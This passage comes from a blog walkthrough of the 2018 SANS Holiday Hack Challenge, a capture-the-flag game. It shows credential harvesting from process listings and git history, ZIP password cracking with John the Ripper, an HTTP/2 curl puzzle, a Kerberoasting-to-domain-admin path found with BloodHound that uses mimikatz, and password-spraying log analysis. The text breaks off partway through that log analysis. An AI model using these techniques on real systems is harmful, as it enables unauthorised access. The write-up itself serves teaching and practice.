<span class="go">s-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //loca</span>
<span class="hll"><span class="go">lhost/report-upload/ directreindeerflatterystable -U report-upload</span>
</span><span class="go">elf         20  0.0  0.0  18208  3360 pts/0    S    22:22   0:00 /bin/bash</span>
<span class="go">root        24  0.0  0.0 316680 15420 ?        Ss   22:22   0:00 /usr/sbin/smbd</span>
<span class="go">root        25  0.0  0.0 308372  5704 ?        S    22:22   0:00 /usr/sbin/smbd</span>
<span class="go">root        26  0.0  0.0 308388  5516 ?        S    22:22   0:00 /usr/sbin/smbd</span>
<span class="go">root        28  0.0  0.0 316664  5868 ?        S    22:22   0:00 /usr/sbin/smbd</span>
<span class="go">manager     49  0.0  0.0   4196   660 pts/0    S    22:27   0:00 sleep 60</span>
<span class="go">elf         50  0.0  0.0  36636  2860 pts/0    R+   22:27   0:00 ps aux</span>
<span class="go">elf         51  0.0  0.0   6556   956 pts/0    S+   22:27   0:00 less</span>
</pre></div>
<p>It seems that some scripts of the <code>manager</code> user are running, with a
<a class="reference external" href="https://www.xkcd.com/936/">password</a> given as a CLI argument. The samba
credentials seem to be <code>report-upload:directreindeerflatterystable</code>.
Let's try them:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@b08c86087276:~$</span> smbclient -U report-upload //localhost/report-upload directreindeerflattery
<span class="go">stable</span>
<span class="go">WARNING: The &quot;syslog&quot; option is deprecated</span>
<span class="go">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]</span>
<span class="go">smb: \&gt; put report.txt</span>
<span class="go">putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)</span>
<span class="go">smb: \&gt; Terminated</span>
<span class="gp">elf@b08c86087276:~$</span>

<span class="go">                               .;;;;;;;;;;;;;;;&#39;</span>
<span class="go">                             ,NWOkkkkkkkkkkkkkkNN;</span>
<span class="go">                           ..KM; Stall Mucking ,MN..</span>
<span class="go">                         OMNXNMd.             .oMWXXM0.</span>
<span class="go">                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc</span>
<span class="go">                        :MO                         xMl             &#39;.</span>
<span class="go">                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.</span>
<span class="go"> .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.</span>
<span class="go"> &#39;kkkkxxxxxddddddoooooooxMO   ..&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.        xMkcccccccllllllllllooc.</span>
<span class="go"> &#39;kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool</span>
<span class="go"> &#39;kkkkxxxxxddddddoooooooxMO   &#39;::::::::::::,        xMkcccccccllllllllllool,</span>
<span class="go"> .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll&#39;</span>
<span class="go">                        :MO  .ONNNNNNNNXk           xMl             :lc&#39;</span>
<span class="go">                        :MO   dOOOOOOOOOo           xMl             ;.</span>
<span class="go">                        :MO   &#39;cccccccccccccc:&#39;     xMl</span>
<span class="go">                        :MO  .WMMMMMMMMMMMMMMMW.    xMl</span>
<span class="go">                        :MO    ...............      xMl</span>
<span class="go">                        .NWxddddddddddddddddddddddddNW&#39;</span>
<span class="go">                          ;ccccccccccccccccccccccccc;</span>

<span class="go">You have found the credentials I just had forgot,</span>
<span class="go">And in doing so you&#39;ve saved me trouble untold.</span>
<span class="go">Going forward we&#39;ll leave behind policies old,</span>
<span class="go">Building separate accounts for each elf in the lot.</span>
<span class="go">-Wunorse Openslae</span>
</pre></div>
<p>Wise words, Wunorse.</p>
</div>
<div class="section" id="north-pole-git-repository">
<h3><a class="toc-backref" href="#id19">North Pole Git Repository</a></h3>
<p>We're supposed to recover an encrypted ZIP file from the <a class="reference external" href="https://git.kringlecastle.com/Upatree/santas_castle_automation">North Pole Git
repository</a>.
Let's clone it, and investigate a little bit:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> git clone https://git.kringlecastle.com/Upatree/santas_castle_automation
<span class="go">Clonage dans &#39;santas_castle_automation&#39;...</span>
<span class="go">warning: redirection vers https://git.kringlecastle.com/Upatree/santas_castle_automation.git/</span>
<span class="go">remote: Enumerating objects: 949, done.</span>
<span class="go">remote: Counting objects: 100% (949/949), done.</span>
<span class="go">remote: Compressing objects: 100% (545/545), done.</span>
<span class="go">remote: Total 949 (delta 258), reused 879 (delta 205)</span>
<span class="go">Réception d&#39;objets: 100% (949/949), 4.27 MiB | 5.85 MiB/s, fait.</span>
<span class="go">Résolution des deltas: 100% (258/258), fait.</span>
<span class="gp">$</span> <span class="nb">cd</span> santas_castle_automation
<span class="gp">$</span> find . -name <span class="s1">&#39;*.zip&#39;</span>
<span class="go">./schematics/ventilation_diagram.zip</span>
</pre></div>
<p>Alright, we have found our ZIP file. Let's try to crack the password, it worked
on previous challenges. To do so, we'll use <a class="reference external" href="https://github.com/magnumripper/JohnTheRipper/">JohnTheRipper</a>.
To be sure that you can crack password-protected ZIP files with
<code>JohnTheRIpper</code>, make sure that you install <code>zlib</code>, otherwise it's
not supported (got quite a few headaches because of this).</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> zip2john ./schematics/ventilation_diagram.zip &gt; ventilation_diagram_hash.txt
<span class="go">ventilation_diagram.zip/ventilation_diagram/ is not encrypted!</span>
<span class="go">ver 1.0 ./schematics/ventilation_diagram.zip/ventilation_diagram/ is not encrypted, or stored with non-handled compression type</span>
<span class="go">ver 2.0 efh 5455 efh 7875 ventilation_diagram.zip/ventilation_diagram/ventilation_diagram_2F.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=366995, decmplen=415586, crc=ACFD98A7</span>
<span class="go">ver 2.0 efh 5455 efh 7875 ventilation_diagram.zip/ventilation_diagram/ventilation_diagram_1F.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=372752, decmplen=421604, crc=8E23EC48</span>
<span class="go">NOTE: It is assumed that all files in each archive have the same password.</span>
<span class="go">If that is not the case, the hash may be uncrackable. To avoid this, use</span>
<span class="go">option -o to pick a file at a time.</span>
<span class="gp">$</span> john --wordlist<span class="o">=</span>~/SecLists/Passwords/Leaked-Databases/md5decryptor.uk.txt ./ventilation_diagram_hash.txt
<span class="go">Using default input encoding: UTF-8</span>
<span class="go">Loaded 1 password hash (PKZIP [32/64])</span>
<span class="go">Will run 8 OpenMP threads</span>
<span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="go">0g 0:00:00:00 DONE (2019-01-01 22:53) 0g/s 14259Kp/s 14259Kc/s 14259KC/s 23248758..wzpxg1kn</span>
<span class="go">Session completed</span>
</pre></div>
<p>Hmm, <code>john</code> was unable to crack our hash. I tried several wordlists, but
to no avail. In most challenges, if there's a password cracking question, the
password will most likely be in common wordlists or leaked databases. So, let's
try something else.</p>
<p>A Git repository can be very resourceful. Indeed, we have access to the files
and the history of modifications, commits, and such. It worked in a <a class="reference external" href="https://allyourbase.utouch.fr/posts/2017/01/05/sans-christmas-challenge-2016/#the-mobile-analytics-server-post-authentication">previous
SANS Christmas challenge</a>.
So, let's give it a try here:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> git log -p <span class="p">|</span> grep -i password
<span class="go">[snip]</span>
<span class="go">-Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.</span>
<span class="go">-Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!</span>
<span class="go">-Hopefully this is the last time we have to change our password again until next Christmas.</span>
<span class="hll"><span class="go">-Password = &#39;Yippee-ki-yay&#39;</span>
</span><span class="go">[snip]</span>
</pre></div>
<p>Alright! We seem to have found our password. Let's try it:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> unzip -d ventilation_diagram -P Yippee-ki-yay ./schematics/ventilation_diagram.zip
<span class="go">Archive:  ./schematics/ventilation_diagram.zip</span>
<span class="go">inflating: ventilation_diagram/ventilation_diagram/ventilation_diagram_2F.jpg</span>
<span class="go">inflating: ventilation_diagram/ventilation_diagram/ventilation_diagram_1F.jpg</span>
</pre></div>
<p>It worked! The password is <code>Yippee-ki-yay</code>, and we gained access to two
files, which seem to be schematics for ventilation conducts: one for the first
floor (<code>1F</code>) and one for the second floor (<code>2F</code>). Maybe they'll
<a class="reference external" href="https://www.youtube.com/watch?v=phs3i0onDDg">come in handy later</a>...</p>
<img alt="ventilation_diagram_1F.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_1F.jpg" />
<img alt="ventilation_diagram_2F.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_2F.jpg" />
</div>
</div>
<div class="section" id="ad-privilege-discovery">
<h2><a class="toc-backref" href="#id20">AD Privilege Discovery</a></h2>
<p>Just as we find the schematics, Hans begins his little speech:</p>
<img alt="hans.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans.png" />
<p><em>Hans says</em></p>
<blockquote>
<p><em>In the main lobby on the bottom floor of Santa's castle, Hans calls
everyone around to deliver a speech.</em></p>
<p>Ladies and Gentlemen…</p>
<p>Ladies and Gentlemen…</p>
<p>Due to the North Pole’s legacy of providing coal as presents around the
globe they are about to be taught a lesson in the real use of POWER.</p>
<p>You will be witnesses.</p>
<p>Now, Santa… that's a nice suit… John Philips, North Pole. I have two
myself. Rumor has it Alabaster buys his there.</p>
<p>I have comrades in arms around the world who are languishing in prison.</p>
<p>The Elvin State Department enjoys rattling its saber for its own ends. Now
it can rattle it for ME.</p>
<p>The following people are to be released from their captors.</p>
<p>In the Dungeon for Errant Reindeer, the seven members of the New Arietes
Front.</p>
<p>In Whoville Prison, the imprisoned leader of ATNAS Corporation, Miss Cindy
Lou Who.</p>
<p>In the Land of Oz, Glinda the Good Witch.</p>
</blockquote>
<p>So, Hans wants the release of the villains who tried to disrupt these past
Christmases. Well, except for the Doctor, who was pardoned. We love you,
Doctor!</p>
<div class="section" id="holly-evergreen-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id21">Holly Evergreen's Cranberry Pi Challenge</a></h3>
<p>The candy striper has stopped, and we must start it again by performing the
right <code>curl</code> command to <a class="reference external" href="http://localhost:8080/">http://localhost:8080/</a>.</p>
<div class="highlight"><pre><span></span><span class="go">I am Holly Evergreen, and now you won&#39;t believe:</span>
<span class="go">Once again the striper stopped; I think I might just leave!</span>
<span class="go">Bushy set it up to start upon a website call.</span>
<span class="go">Darned if I can CURL it on - my Linux skills apall.</span>
<span class="go">Could you be our CURLing master - fixing up this mess?</span>
<span class="go">If you are, there&#39;s one concern you surely must address.</span>
<span class="go">Something&#39;s off about the conf that Bushy put in place.</span>
<span class="go">Can you overcome this snag and save us all some face?</span>
<span class="go">  Complete this challenge by submitting the right HTTP</span>
<span class="go">  request to the server at http://localhost:8080/ to</span>
<span class="go">  get the candy striper started again. You may view</span>
<span class="go">  the contents of the nginx.conf file in</span>
<span class="go">  /etc/nginx/, if helpful.</span>
<span class="gp">elf@451e98e0a27c:~$</span>
</pre></div>
<p>Let's start with something simple:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@44672f31f7a9:~$</span> curl http://localhost:8080/
<span class="go">   ����</span>
</pre></div>
<p>Hmm, nothing useful. I took a look at <code>/etc/nginx/sites-enabled/default</code>
(the only enabled file), but nothing interesting. I then tried to take a look
at several configuration file (<code>/etc/nginx/snippets/fastcgi-php.conf</code>,
<code>/etc/nginx/fastcgi.conf</code>, <code>/etc/php/7.0/fpm/php-fpm.conf</code>, etc.),
but nothing interesting. I then realized that the prompt tells us to look at
<code>/etc/nginx/nginx.conf</code> 🤦‍♂️. Anyway, let's take a look:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@44672f31f7a9:/etc/nginx$</span> cat nginx.conf
<span class="go">user www-data;</span>
<span class="go">worker_processes auto;</span>
<span class="go">pid /run/nginx.pid;</span>
<span class="go">include /etc/nginx/modules-enabled/*.conf;</span>
<span class="go">events {</span>
<span class="go">        worker_connections 768;</span>
<span class="gp">        #</span> multi_accept on<span class="p">;</span>
<span class="go">}</span>
<span class="go">http {</span>
<span class="go">[snip]</span>
<span class="go">        server {</span>
<span class="gp">        #</span> love using the new stuff! -Bushy
<span class="hll"><span class="go">                listen                  8080 http2;</span>
</span><span class="gp">                #</span> server_name           localhost <span class="m">127</span>.0.0.1<span class="p">;</span>
<span class="go">                root /var/www/html;</span>
<span class="go">                location ~ [^/]\.php(/|$) {</span>
<span class="go">                    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span>
<span class="go">                    if (!-f $document_root$fastcgi_script_name) {</span>
<span class="go">                        return 404;</span>
<span class="go">                    }</span>
<span class="gp">                    #</span> Mitigate https://httpoxy.org/ vulnerabilities
<span class="go">                    fastcgi_param HTTP_PROXY &quot;&quot;;</span>
<span class="gp">                    #</span> SCRIPT_FILENAME parameter is used <span class="k">for</span> PHP FPM determining

<span class="gp">                    #</span> fastcgi_pass <span class="m">127</span>.0.0.1:9000<span class="p">;</span>
<span class="go">                    fastcgi_pass unix:/var/run/php/php-fpm.sock;</span>
<span class="go">                    fastcgi_index index.php;</span>

<span class="gp">                    #</span> include the fastcgi_param setting
<span class="go">                    include fastcgi_params;</span>

<span class="gp">                    #</span> SCRIPT_FILENAME parameter is used <span class="k">for</span> PHP FPM determining
<span class="gp">                    #</span>  the script name. If it is not <span class="nb">set</span> in fastcgi_params file,
<span class="gp">                    #</span> i.e. /etc/nginx/fastcgi_params or in the parent contexts,
<span class="gp">                    #</span> please comment off following line:
<span class="gp">                    #</span> fastcgi_param  SCRIPT_FILENAME   <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
<span class="go">                }</span>

<span class="go">                }</span>
<span class="go">[snip]</span>
</pre></div>
<p>Ah! The webserver is configured to use HTTP/2. We take a look at <code>curl</code>'s
<code>man</code> page, and we find the <code>--http2</code> option. Let's try it:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@44672f31f7a9:/etc/nginx$</span> curl --http2 http://localhost:8080/
<span class="go">   ����</span>
</pre></div>
<p>Hmm, same result as before. I then tried several options, regarding the
compression, and other stuff, but it didn't work. Out of frustration, I tried
another HTTP/2 option, to wit <code>--http2-prior-knowledge</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@44672f31f7a9:/etc/nginx$</span> curl --http2-prior-knowledge http://localhost:8080/
<span class="go">&lt;html&gt;</span>
<span class="go"> &lt;head&gt;</span>
<span class="go">  &lt;title&gt;Candy Striper Turner-On&#39;er&lt;/title&gt;</span>
<span class="go"> &lt;/head&gt;</span>
<span class="go"> &lt;body&gt;</span>
<span class="go"> &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;</span>

<span class="go"> &lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
<p>Wow, it worked. I couldn't believe it. Let's take a closer look at what this
options does:</p>
<blockquote>
<table class="docutils option-list" frame="void" rules="none">
<col class="option" />
<col class="description" />
<tbody valign="top">
<tr><td class="option-group" colspan="2">
<kbd><span class="option">--http2-prior-knowledge</span></kbd></td>
</tr>
<tr><td>&nbsp;</td><td>(HTTP) Tells curl to issue its non-TLS HTTP requests using HTTP/2 without HTTP/1.1 Upgrade. It requires prior knowledge that the server supports HTTP/2 straight  away.  HTTPS  requests
will still do HTTP/2 the standard way with negotiated protocol version in the TLS handshake.</td></tr>
</tbody>
</table>
</blockquote>
<p>Apparently, it's used when you know that the server is using HTTP/2, and you
contact it in plain text, and you don't want to rely on the HTTP/1.1 to HTTP/2
upgrade. This is exactly our use-case. Anyway, the server tells us to perform
a <code>POST</code> request, with <code>status=on</code>. This can be done with
<code>curl</code> with the <code>-d</code> option:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@451e98e0a27c:~$</span> curl --http2-prior-knowledge -d <span class="s1">&#39;status=on&#39;</span> http://localhost:8080/
<span class="go">&lt;html&gt;</span>
<span class="go"> &lt;head&gt;</span>
<span class="go">  &lt;title&gt;Candy Striper Turner-On&#39;er&lt;/title&gt;</span>
<span class="go"> &lt;/head&gt;</span>
<span class="go"> &lt;body&gt;</span>
<span class="go"> &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;</span>

<span class="go">                                                                okkd,</span>
<span class="go">                                                               OXXXXX,</span>
<span class="go">                                                              oXXXXXXo</span>
<span class="go">                                                             ;XXXXXXX;</span>
<span class="go">                                                            ;KXXXXXXx</span>
<span class="go">                                                           oXXXXXXXO</span>
<span class="go">                                                        .lKXXXXXXX0.</span>
<span class="go">  &#39;&#39;&#39;&#39;&#39;&#39;       .&#39;&#39;&#39;&#39;&#39;&#39;       .&#39;&#39;&#39;&#39;&#39;&#39;       .:::;   &#39;:okKXXXXXXXX0Oxcooddool,</span>
<span class="go"> &#39;MMMMMO&#39;,,,,,;WMMMMM0&#39;,,,,,;WMMMMMK&#39;,,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.</span>
<span class="go"> &#39;MMMMN;,,,,,&#39;0MMMMMW;,,,,,&#39;OMMMMMW:,,,,,&#39;kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;</span>
<span class="go"> &#39;MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x.</span>
<span class="go"> &#39;MMMO&#39;,,,,,;WMMMMMO&#39;,,,,,,NMMMMMK&#39;,,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX:</span>
<span class="go"> &#39;MMN,,,,,,&#39;OMMMMMW;,,,,,&#39;kMMMMMW;,,,,,&#39;xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.</span>
<span class="go"> &#39;MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.</span>
<span class="go"> &#39;M0&#39;,,,,,;WMMMMM0&#39;,,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.</span>
<span class="go"> .c.......&#39;cccccc.......&#39;cccccc.......&#39;cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc</span>
<span class="go">                                                    ;xKXXXXXXX0xKXXXXXXXXK.</span>
<span class="go">                                                       ..,:ccllc:cccccc:&#39;</span>

<span class="go">Unencrypted 2.0? He&#39;s such a silly guy.</span>
<span class="go">That&#39;s the kind of stunt that makes my OWASP friends all cry.</span>
<span class="go">Truth be told: most major sites are speaking 2.0;</span>
<span class="go">TLS connections are in place when they do so.</span>
<span class="go">-Holly Evergreen</span>
<span class="go">&lt;p&gt;Congratulations! You&#39;ve won and have successfully completed this challenge.</span>
<span class="go">&lt;p&gt;POSTing data in HTTP/2.0.</span>
<span class="go"> &lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
<p>And just like that, our candy striper started up!</p>
</div>
<div class="section" id="sans-slingshot-linux-image">
<h3><a class="toc-backref" href="#id22">SANS Slingshot Linux image</a></h3>
<p>We're supposed to take a look at the data set contained in this <a class="reference external" href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova">Slinghost
LInux image</a>
to find how to elevate our privileges on a Active Directory environment. Let's
fire up VirtualBox and start the VM. <strong>Make sure that you configure the VM to
run in 64 bits, or it won't boot</strong> (I lost half an hour before figuring this
out).</p>
<p>When the VM boots up, we get access to a Linux desktop, with a shortcut to the
<code>BloodHound</code> tool.</p>
<img alt="slingshot_desktop.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_desktop.png" />
<p><a class="reference external" href="https://github.com/BloodHoundAD/BloodHound">This tool</a>, created by the
<a class="reference external" href="https://specterops.io/">Specter Ops</a> team, can be used to easily find a
privilege escalation path from simple user to domain administrator:</p>
<img alt="slingshot_bloodhound_interface.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_bloodhound_interface.png" />
<p>We're asked to find a path from a Kerberoastable user to domain administrator
privileges. If you want more information on Kerberoasting, here are a few
resources:</p>
<ul class="simple">
<li><a class="reference external" href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf">Tim Medin: Attacking Kerberos: Kicking the Guard Dog of Hades</a>.</li>
<li>Rob Fuller's <a class="reference external" href="https://malicious.link/post/2016/kerberoast-pt1/">three</a> <a class="reference external" href="https://malicious.link/post/2016/kerberoast-pt2/">part</a> <a class="reference external" href="https://malicious.link/post/2016/kerberoast-pt3/">series</a> on the topic.</li>
<li>Will Schroeder's <a class="reference external" href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">detailed explanation</a> of the attack and on how to perform it.</li>
</ul>
<p>Luckily, <code>BloodHound</code> has a query to search such a path:</p>
<img alt="slingshot_bloodhound_kerberoast_query.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_bloodhound_kerberoast_query.png" />
<p>If we click on it, we get this result:</p>
<img alt="slingshot_kerberoast_result.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_kerberoast_result.png" />
<p>Now, we're told not to rely on RDP access to determine administrative access.
So let's focus on this part of the graph:</p>
<img alt="slingshot_kerberoast_result_details.png" class="align-center" src="/images/sans-christmas-challenge-2018/slingshot_kerberoast_result_details.png" />
<p>Here's the attack flow:</p>
<ul class="simple">
<li><code>LDUBEJ00320&#64;AD.KRINGLECASTLE.COM</code> is a Kerberoastable user, so we can
recover their password (it it's weak enough).</li>
<li>They're a member of the <code>IT_00332</code> group. This group (and thus, so are
we) is local administrator on the <code>COMP00185</code> computer.</li>
<li><code>JBETAK00084&#64;AD.KRINGLECASTLE.COM</code> has a session on the
<code>COMP00185</code> computer. Since we're local administrator on this machine,
we can recover <code>JBETAK00084</code>'s password (for example, using
<code>mimikatz</code>)</li>
<li><code>JBETAK00084</code> is a member of the domain administrator group. Since we
can get their password, we can elevate our privileges to domain administrator.</li>
</ul>
<p>Therefore, the initial user we're looking for is
<code>LDUBEJ00320&#64;AD.KRINGLECASTLE.COM</code>.</p>
</div>
</div>
<div class="section" id="badge-manipulation">
<h2><a class="toc-backref" href="#id23">Badge Manipulation</a></h2>
<p>Things keep getting more tense:</p>
<img alt="toy_soldier_blue.png" class="align-center" src="/images/sans-christmas-challenge-2018/toy_soldier_blue.png" />
<p><em>The toy soldiers say</em></p>
<blockquote>
<p><em>The toy soldiers continue behaving very rudely, grunting orders to the
guests and to each other in vaguely Germanic phrases.</em></p>
<blockquote>
<p>Links.</p>
<p>Nein! Nein! Nein!</p>
<p>No one is coming to help you.</p>
<p>Get the over here!</p>
<p>Schnell!</p>
</blockquote>
<p><em>Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that
has written on it in red pen,</em> <a class="reference external" href="https://www.youtube.com/watch?v=DlQoXP2XH68">&quot;NOW I HAVE A ZERO-DAY. HO-HO-HO.&quot;</a></p>
<p><em>A rumor spreads among the elves that Alabaster has lost his badge. Several
elves say, &quot;What do you think someone could do with that?&quot;</em></p>
</blockquote>
<div class="section" id="pepper-minstix-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id24">Pepper Minstix' Cranberry Pi Challenge</a></h3>
<p>Apparently, someone's email account was compromised, and we have to analyze
logs to find out which one:</p>
<div class="highlight"><pre><span></span><span class="go">I am Pepper Minstix, and I&#39;m looking for your help.</span>
<span class="go">Bad guys have us tangled up in pepperminty kelp!</span>
<span class="go">&quot;Password spraying&quot; is to blame for this our grinchly fate.</span>
<span class="go">Should we blame our password policies which users hate?</span>

<span class="go">Here you&#39;ll find a web log filled with failure and success.</span>
<span class="go">One successful login there requires your redress.</span>
<span class="go">Can you help us figure out which user was attacked?</span>
<span class="go">Tell us who fell victim, and please handle this with tact...</span>

<span class="go">  Submit the compromised webmail username to</span>
<span class="go">  runtoanswer to complete this challenge.</span>
<span class="gp">elf@3c8eb61a4504:~$</span>
</pre></div>
<p>Let's take a look at the file we have:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@3c8eb61a4504:~$</span> ls -lh
<span class="go">total 6.8M</span>
<span class="go">-rw-r--r-- 1 elf elf 1.4K Dec 14 16:13 evtx_dump.py</span>
<span class="go">-rw-r--r-- 1 elf elf 1.1M Dec 14 16:13 ho-ho-no.evtx</span>
<span class="go">-rwxr-xr-x 1 elf elf 5.7M Dec 14 16:13 runtoanswer</span>
</pre></div>
<p>So, we have <code>runtoanswer</code> — once we have found who was compromised —,
we have <code>ho-ho-no.evtx</code> — which is a Windows log extract — and we have
a <code>evtx_dump.py</code> Python script, which parses the <code>.evtx</code>, and dump
the result in an XML format:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@3c8eb61a4504:~$</span> python evtx_dump.py ho-ho-no.evtx
<span class="go">&lt;?xml version=&quot;1.1&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot; ?&gt;</span>
<span class="go">&lt;Events&gt;</span>
<span class="go">&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;&lt;System&gt;&lt;Provider Name=&quot;Mi</span>
<span class="go">crosoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;&gt;&lt;/Provider&gt;</span>
<span class="go">&lt;EventID Qualifiers=&quot;&quot;&gt;4647&lt;/EventID&gt;</span>
<span class="go">&lt;Version&gt;0&lt;/Version&gt;</span>
<span class="go">&lt;Level&gt;0&lt;/Level&gt;</span>
<span class="go">&lt;Task&gt;12545&lt;/Task&gt;</span>
<span class="go">&lt;Opcode&gt;0&lt;/Opcode&gt;</span>
<span class="go">&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;</span>
<span class="go">&lt;TimeCreated SystemTime=&quot;2018-09-10 12:18:26.972103&quot;&gt;&lt;/TimeCreated&gt;</span>
<span class="go">&lt;EventRecordID&gt;231712&lt;/EventRecordID&gt;</span>
<span class="go">&lt;Correlation ActivityID=&quot;{fd18dc13-48f8-0001-58dc-18fdf848d401}&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correla</span>
<span class="go">tion&gt;</span>
<span class="go">&lt;Execution ProcessID=&quot;660&quot; ThreadID=&quot;752&quot;&gt;&lt;/Execution&gt;</span>
<span class="go">&lt;Channel&gt;Security&lt;/Channel&gt;</span>
<span class="go">&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;</span>
<span class="go">&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;</span>
<span class="go">&lt;/System&gt;</span>
<span class="go">&lt;EventData&gt;&lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-25059752-1411454016-2901770228-500&lt;/Data&gt;</span>
<span class="go">&lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator&lt;/Data&gt;</span>
<span class="go">&lt;Data Name=&quot;TargetDomainName&quot;&gt;EM.KRINGLECON&lt;/Data&gt;</span>
<span class="go">&lt;Data Name=&quot;TargetLogonId&quot;&gt;0x0000000000969b09&lt;/Data&gt;</span>
<span class="go">&lt;/EventData&gt;</span>
<span class="go">&lt;/Event&gt;</span>
<span class="go">[snip]</span>
</pre></div>
<p>For ease of analysis, you can download the XML file <a class="reference external" href="/docs/sans-christmas-challenge-2018/ho-ho-no.xml">here</a>.
We're told that the attack was a <a class="reference external" href="https://www.triaxiomsecurity.com/2018/11/08/password-spraying-attack/">password spraying</a>
attack. This means that an attacker chooses a well-known or very probable
password, such as <code>P&#64;ssw0rd</code>, or <code>Winter2018</code>, and tries to
authenticate as every user with this password. This can be very efficient,
because it allows to find weak accounts, without risking blocking any account.</p>
<p>If we look at the XML log file, we can see that the attacker tried to
authenticate as every user in alphabetical order, starting with
<code>aaron.smith</code>, <code>abhishek.kumar</code>, etc., all the way down to
<code>vinod.kumar</code>, <code>wunorse.openslae</code>. If the login didn't work, we
can see that the event has an attribute <code>&lt;Data Name=&quot;FailureReason&quot;&gt;</code>.
Let's try some regex magic to find which user does not have such an attribute:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep -E <span class="s1">&#39;&lt;Data Name=&quot;TargetUserName&quot;&gt;[a-z.]+&lt;/Data&gt;|&lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;&#39;</span> ho-ho-no.xml <span class="c1"># We only target users with lower-case username</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;sparkle.redberry&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;sparkle.redberry&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;sparkle.redberry&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;bushy.evergreen&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;bushy.evergreen&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;test.user&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;shinny.upatree&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;shinny.upatree&lt;/Data&gt;</span>
